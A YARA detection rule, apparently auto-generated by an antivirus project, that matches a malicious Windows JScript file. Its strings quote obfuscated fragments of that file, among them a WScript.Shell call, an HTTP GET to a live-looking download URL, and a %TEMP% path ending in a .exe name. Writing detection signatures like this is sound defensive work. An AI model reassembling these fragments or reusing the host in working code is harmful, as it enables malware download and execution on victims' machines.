rule sig_20160401_2eba931d7f13738ee89f22b222dbdc0b {
  meta:
    description = "datamaliciousorder - file 20160401_2eba931d7f13738ee89f22b222dbdc0b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d04ef0c33b59b91831cf196d510e723f7b7bf20a887ad065486204d99a6d5691"

  strings:
    $s1  = "var FazXe = function XvDs() {return WScript[RhdKxr](\"WScript\"+\".Shell\");}(), MtxNqm = 11;" fullword ascii
    $s2  = "FcZhn[YjAd](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s3  = "if (FcZhn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function TkkPf(KdTlw, PpzWdv){CapHz = CapHz * 1; return KdTlw - PpzWdv;};" fullword ascii
    $s5  = "function MrtYr() {return FazXe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7cVXVsO8R0.ex\" + \"e\";};" fullword ascii
    $s6  = "function DoKlo(){return GkHc + \"\";};" fullword ascii
    $s7  = "return TkkPf(HjTo, EqKff);" fullword ascii
    $s8  = "var LbRh = false;" fullword ascii
    $s9  = "function JcrUd(){return RhdKxr;};" fullword ascii
    $s10 = "function LtnVan(){return 23;};" fullword ascii
    $s11 = "var GyEny = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (XxdJx);" fullword ascii
    $s13 = "LbRh = true; " fullword ascii
    $s14 = "function TpAox(GeYvw) {var JhDta = (1, 2, 3, 4, 5, GeYvw); return JhDta;};" fullword ascii
    $s15 = "NxjAbd = true; " fullword ascii
    $s16 = "function SoLpu()" fullword ascii
    $s17 = "var DiwGic = false;" fullword ascii
    $s18 = "var NxjAbd = false;" fullword ascii
    $s19 = "function RqUas() {return ((LbRh == true) && (LbRh == NxjAbd)) ? 1 : CapHz;};" fullword ascii
    $s20 = "} catch(FntQpv){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}